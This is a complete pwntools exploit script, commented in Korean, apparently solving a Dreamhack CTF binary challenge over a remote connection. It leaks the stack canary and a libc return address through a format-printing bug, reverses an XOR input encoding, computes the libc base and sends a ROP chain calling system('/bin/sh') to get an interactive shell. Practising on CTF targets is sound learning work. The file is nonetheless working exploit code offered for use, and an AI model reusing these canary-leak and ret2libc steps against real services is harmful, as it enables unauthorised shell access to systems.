from pwn import *

context.binary = e = ELF('./prob')
p = remote('host3.dreamhack.games', 15290)
libc = ELF('./libc.so.6')

# __libc_start_main 안에서 main 복귀 지점(ret_leak) offset을 자동 계산
def find_ret_offset(libc):
    lsm = libc.symbols['__libc_start_main']              # 이 심볼은 존재
    md = libc.disasm(lsm, 0x100)                          # __libc_start_main 디스어셈
    # 내부에서 __libc_start_call_main을 호출하는 첫 'call 0x...' 대상 주소
    for line in md.splitlines():
        parts = line.split('call')
        if len(parts) == 2 and parts[1].strip().startswith('0x'):
            target = int(parts[1].split()[0], 16)         # = __libc_start_call_main
            # 그 함수 안에서 main을 호출하는 'call rax' 다음 명령 주소 = ret_leak offset
            md2 = libc.disasm(target, 0x120).splitlines()
            for i, l2 in enumerate(md2):
                if 'call' in l2 and 'rax' in l2:
                    nxt = md2[i + 1]                       # call rax 바로 다음 명령
                    return int(nxt.split(':')[0].strip(), 16)
    raise ValueError('offset not found')

RET_OFF = find_ret_offset(libc)
log.info(f'RET_OFF (auto): {hex(RET_OFF)}')

# out(스택에 실제 쓰이고 %s로 출력될 값) -> in(read로 보낼 값) 역변환
def encode(out):
    n = len(out)
    inp = bytearray(n)
    inp[n-1] = out[n-1]
    for i in range(n-2, -1, -1):
        inp[i] = out[i] ^ inp[i+1]
    return bytes(inp)

# Step 1: canary leak
p.sendafter(b'Input: ', encode(b'A' * 25))
p.recvuntil(b'You entered: ')
data = p.recvline()
canary = u64(b'\x00' + data[25:32])
log.info(f'Canary: {hex(canary)}')

# Step 2: libc leak
p.sendafter(b'Input: ', encode(b'A' * 0x28))
p.recvuntil(b'You entered: ')
data = p.recvline()
ret_leak = u64(data[0x28:0x28+6].ljust(8, b'\x00'))
libc_base = ret_leak - RET_OFF                            # 심볼 대신 자동 offset
log.info(f'Leaked address: {hex(ret_leak)}')
log.info(f'Libc base: {hex(libc_base)}')

# Step 3: ROP chain
libc.address = libc_base          # 이후 모든 심볼·가젯이 실주소 반환
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]   
ret     = rop.find_gadget(['ret'])[0]             
system  = libc.sym['system']
binsh   = next(libc.search(b'/bin/sh\x00'))

log.info(f'pop_rdi : {hex(pop_rdi)}')   # 검증: libc_base와 같은 상위 바이트인지
log.info(f'system  : {hex(system)}')

payload3  = b'\x00'
payload3 += b'A' * 0x17
payload3 += p64(canary)
payload3 += b'B' * 8
payload3 += p64(ret)         # 정렬용
payload3 += p64(pop_rdi)
payload3 += p64(binsh)
payload3 += p64(system)

p.sendafter(b'Input: ', encode(payload3))
p.interactive()